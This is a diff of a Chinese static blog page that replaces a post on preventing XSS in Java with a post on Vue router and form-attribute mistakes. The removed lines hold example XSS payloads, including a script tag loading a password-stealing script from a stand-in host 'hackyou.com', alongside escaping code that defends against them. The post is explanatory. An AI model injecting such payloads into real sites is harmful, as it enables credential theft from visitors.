@@ -74,7 +74,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="java,Network Security," />
+  <meta name="keywords" content="vue," />
 
 
 
@@ -92,18 +92,18 @@
 
 
 
-<meta name="description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
-<meta name="keywords" content="java,Network Security">
+<meta name="description" content="开篇此文仅用于记录vue开发中遇到的各种奇葩事。 错误项目不报错但是路由不加载前方预警：这是个低级错误Orzindex.js1234567891011routes: [    &amp;#123;      path: &amp;apos;/&amp;apos;,      name: &amp;apos;Index&amp;apos;,      component: &amp;#123;        nav: Navv,        m">
+<meta name="keywords" content="vue">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java如何防范XSS攻击">
-<meta property="og:url" content="https://amosannn.github.io/2017/05/27/xss/index.html">
+<meta property="og:title" content="Vue开发路上遇到的坑儿们">
+<meta property="og:url" content="https://amosannn.github.io/2018/01/24/vue-error-collection/index.html">
 <meta property="og:site_name" content="Amosannn">
-<meta property="og:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
+<meta property="og:description" content="开篇此文仅用于记录vue开发中遇到的各种奇葩事。 错误项目不报错但是路由不加载前方预警：这是个低级错误Orzindex.js1234567891011routes: [    &amp;#123;      path: &amp;apos;/&amp;apos;,      name: &amp;apos;Index&amp;apos;,      component: &amp;#123;        nav: Navv,        m">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-06-01T16:04:44.000Z">
+<meta property="og:updated_time" content="2018-01-24T03:18:10.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java如何防范XSS攻击">
-<meta name="twitter:description" content="什么是XSSXSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，wiki里写的很清楚。 XSS原理我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步">
+<meta name="twitter:title" content="Vue开发路上遇到的坑儿们">
+<meta name="twitter:description" content="开篇此文仅用于记录vue开发中遇到的各种奇葩事。 错误项目不报错但是路由不加载前方预警：这是个低级错误Orzindex.js1234567891011routes: [    &amp;#123;      path: &amp;apos;/&amp;apos;,      name: &amp;apos;Index&amp;apos;,      component: &amp;#123;        nav: Navv,        m">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://amosannn.github.io/2017/05/27/xss/"/>
+  <link rel="canonical" href="https://amosannn.github.io/2018/01/24/vue-error-collection/"/>
 
 
 
 
 
-  <title>Java如何防范XSS攻击 | Amosannn</title>
+  <title>Vue开发路上遇到的坑儿们 | Amosannn</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -305,7 +305,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/05/27/xss/">
+    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2018/01/24/vue-error-collection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Amosannn">
@@ -322,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Java如何防范XSS攻击</h1>
+          <h1 class="post-title" itemprop="name headline">Vue开发路上遇到的坑儿们</h1>
         
 
         <div class="post-meta">
@@ -334,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-27T22:45:01+08:00">
-                2017-05-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-24T10:52:06+08:00">
+                2018-01-24
               </time>
             
 
@@ -345,28 +345,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
-                    <span itemprop="name">技术一路走到黑</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -375,9 +353,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/05/27/xss/#comments" itemprop="discussionUrl">
+                <a href="/2018/01/24/vue-error-collection/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/27/xss/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/01/24/vue-error-collection/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -402,22 +380,13 @@
       
 
       
-        <h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
-<p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">wiki</a>里写的很清楚。</p>
-<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>惊不惊喜？<br><a id="more"></a></p>
-<h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><p>XSS通常有两类：</p>
-<blockquote>
-<ul>
-<li>存储型XSS，主要出现在用户输入后会在下个页面显示的表单。例如评论或调查问卷。</li>
-<li>反射型XSS，主要表现为将脚本代码添加进URL地址的请求参数中。</li>
-</ul>
-</blockquote>
-<h1 id="如何预防XSS"><a href="#如何预防XSS" class="headerlink" title="如何预防XSS"></a>如何预防XSS</h1><p>在用户的每次提交前进行html转义，将html中的特定符号，如<code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>&quot;</code>等分别转换为html转义字符<code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;amp;</code> <code>&amp;quot;</code> 。</p>
-<p>java转义方法：<br>使用jar包 <code>org.springframework.web.util.HtmlUtils</code>，关于html转义的操作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** HTML转义 **/</span>  </span><br><span class="line">String s = HtmlUtils.htmlEscape(<span class="string">"&lt;div&gt;hello world&lt;/div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;"</span>);  </span><br><span class="line">System.out.println(s);  </span><br><span class="line">String s2 = HtmlUtils.htmlUnescape(s);  </span><br><span class="line">System.out.println(s2);</span><br></pre></td></tr></table></figure></p>
-<p>实例：在调用和数据库连接的DAO方法前，进行转义，例如注册和评论等功能。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">doreview</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Page page)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> oid = Integer.parseInt(request.getParameter(<span class="string">"oid"</span>));</span><br><span class="line">	Order o = orderDAO.get(oid);</span><br><span class="line">	o.setStatus(orderDAO.finish);</span><br><span class="line">	orderDAO.update(o);</span><br><span class="line">	<span class="keyword">int</span> pid = Integer.parseInt(request.getParameter(<span class="string">"pid"</span>));</span><br><span class="line">	Product p = productDAO.get(pid);</span><br><span class="line"></span><br><span class="line">	String content = request.getParameter(<span class="string">"content"</span>);</span><br><span class="line">	content = HtmlUtils.htmlEscape(content);</span><br><span class="line"></span><br><span class="line">	User user = (User) request.getSession().getAttribute(<span class="string">"user"</span>);</span><br><span class="line">	Review review = <span class="keyword">new</span> Review();</span><br><span class="line">	review.setContent(content);</span><br><span class="line">	review.setProduct(p);</span><br><span class="line">	review.setCreateDate(<span class="keyword">new</span> Date());</span><br><span class="line">	review.setUser(user);</span><br><span class="line">	reviewDAO.add(review);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"@forereview?oid="</span>+oid+<span class="string">"&amp;showonly=true"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>相关链接:<br><a href="https://www.zhihu.com/question/19739025" target="_blank" rel="noopener">2011年新浪微博XSS事件</a><br><a href="https://gist.github.com/ninehills/1053066" target="_blank" rel="noopener">新浪微博XSS攻击代码</a><br><a href="http://tool.oschina.net/commons?type=2" target="_blank" rel="noopener">html转义字符对照表</a><br><a href="http://tieba.baidu.com/p/3567794788" target="_blank" rel="noopener">简单说下XSS黑站，请注意防范。</a></p>
+        <h1 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h1><p>此文仅用于记录vue开发中遇到的各种奇葩事。</p>
+<h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h2 id="项目不报错但是路由不加载"><a href="#项目不报错但是路由不加载" class="headerlink" title="项目不报错但是路由不加载"></a>项目不报错但是路由不加载</h2><p>前方预警：这是个低级错误Orz<br>index.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/&apos;,</span><br><span class="line">      name: &apos;Index&apos;,</span><br><span class="line">      component: &#123;</span><br><span class="line">        nav: Navv,</span><br><span class="line">        main: Index,</span><br><span class="line">        footer: Footter</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
+<p>App.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;router-view name=&quot;nav&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;main&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;footer&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如果你和我一样是只小白菜，可能咋一看会发现没什么毛病，仔细一看就会发现路由配置里的<code>components</code>被我写成了·component·。。<br>vue中到目前为止我知道的两种路由配置方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">...</span><br><span class="line">component: navv</span><br><span class="line">...</span><br><span class="line">// 第二种</span><br><span class="line">components: &#123;</span><br><span class="line">	navv</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>over, 经验值 +1</p>
+<h2 id="Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name"><a href="#Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name" class="headerlink" title="Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name."></a>Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name.</h2><p>由于项目中引入了饿了么开发的组件库·element-ui·，所以一度以为是和我引入的css文件起了冲突？？甚至我还去执行了<code>npm uninstall element-ui</code>这条命令。最后实在没办法了，一段一段代码排查问题，找到一个诡异的地方。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/listTopic&quot; method+=&quot;post&quot;&gt;</span><br><span class="line">  &lt;input name=&quot;topicName&quot; type=&quot;text&quot; class=&quot;search-input&quot; placeholder=&quot;搜索你感兴趣的内容...&quot;&gt;</span><br><span class="line">  &lt;button type=&quot;submit&quot; class=&quot;search-button&quot;&gt;&lt;i class=&quot;sprite-search&quot;&gt;&lt;/i&gt;&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<p>噗。。form标签下的method方法多了个+号。。。想拿头去撞豆腐了。<br>ok，经验值 +1</p>
 
       
     </div>
@@ -447,9 +416,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/java/" rel="tag"># java</a>
-          
-            <a href="/tags/Network-Security/" rel="tag"># Network Security</a>
+            <a href="/tags/vue/" rel="tag"># vue</a>
           
         </div>
       
@@ -462,8 +429,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/25/implement-queue-by-two-stacks/" rel="next" title="两个栈实现一个队列">
-                <i class="fa fa-chevron-left"></i> 两个栈实现一个队列
+              <a href="/2017/12/24/remove-your-own-python/" rel="next" title="如何删除自己安装的python(干净、无残留)">
+                <i class="fa fa-chevron-left"></i> 如何删除自己安装的python(干净、无残留)
               </a>
             
           </div>
@@ -471,10 +438,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/05/28/java-get-time/" rel="prev" title="使用Calendar或DateFormat拆分日期">
-                使用Calendar或DateFormat拆分日期 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -646,7 +609,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS原理"><span class="nav-number">2.</span> <span class="nav-text">XSS原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞分类"><span class="nav-number">3.</span> <span class="nav-text">XSS漏洞分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何预防XSS"><span class="nav-number">4.</span> <span class="nav-text">如何预防XSS</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#开篇"><span class="nav-number">1.</span> <span class="nav-text">开篇</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#错误"><span class="nav-number">2.</span> <span class="nav-text">错误</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#项目不报错但是路由不加载"><span class="nav-number">2.1.</span> <span class="nav-text">项目不报错但是路由不加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name"><span class="nav-number">2.2.</span> <span class="nav-text">Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name.</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -789,9 +752,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'https://amosannn.github.io/2017/05/27/xss/';
-          this.page.identifier = '2017/05/27/xss/';
-          this.page.title = 'Java如何防范XSS攻击';
+          this.page.url = 'https://amosannn.github.io/2018/01/24/vue-error-collection/';
+          this.page.identifier = '2018/01/24/vue-error-collection/';
+          this.page.title = 'Vue开发路上遇到的坑儿们';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://amosannn.disqus.com/embed.js';
